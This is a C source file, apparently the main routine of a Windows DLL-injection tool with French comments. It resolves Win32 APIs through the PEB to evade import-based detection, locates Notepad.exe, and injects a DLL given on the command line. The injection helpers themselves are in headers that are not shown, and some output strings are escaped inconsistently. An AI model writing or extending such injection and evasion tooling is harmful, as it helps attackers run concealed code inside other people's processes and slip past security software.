#include <dll-injector/main.h>
#include "utils/peb-lookup.h"
#include "utils/memory.h"

/**
 * @brief Point d'entrée du programme d'injection.
 *
 * Initialise la résolution dynamique des API via le PEB, localise Notepad.exe
 * dans la liste des processus actifs, puis injecte la DLL spécifiée.
 *
 * @param argc Nombre d'arguments de la ligne de commande.
 * @param argv Vecteur d'arguments ; argv[1] doit contenir le chemin de la DLL cible.
 * @return 0 en cas de succès, 1 en cas d'erreur.
 */
int main(int argc, char** argv){
  DWORD targetPid;
  HANDLE hProcess;
  LPVOID remoteBuffer;

  /* Initialisation obligatoire des API Win32 résolues dynamiquement via le PEB.
   * Aucun appel système Windows ne doit précéder cette opération. */
  if(!InitDynamicAPIs()){
    printf("Échec de l'initialisation des API dynamiques via le PEB.\n");
    return 1;
  }

  if(argc < 2){
    printf("Usage : %s <chemin_dll>\\n", argv[0]);
    return 1;
  }

  targetPid = ProcessWalking("Notepad.exe");
  if(targetPid == 0){
    printf("Processus cible notepad.exe introuvable.\\n");
    return 1;
  }

  remoteBuffer = NULL;
  hProcess = injectDll(targetPid, argv[1], &remoteBuffer);
  if(hProcess == NULL){
    printf("Échec de l'injection de la DLL.\\n");
    return 1;
  }

  mem_close_handle(hProcess);
  return 0;
}
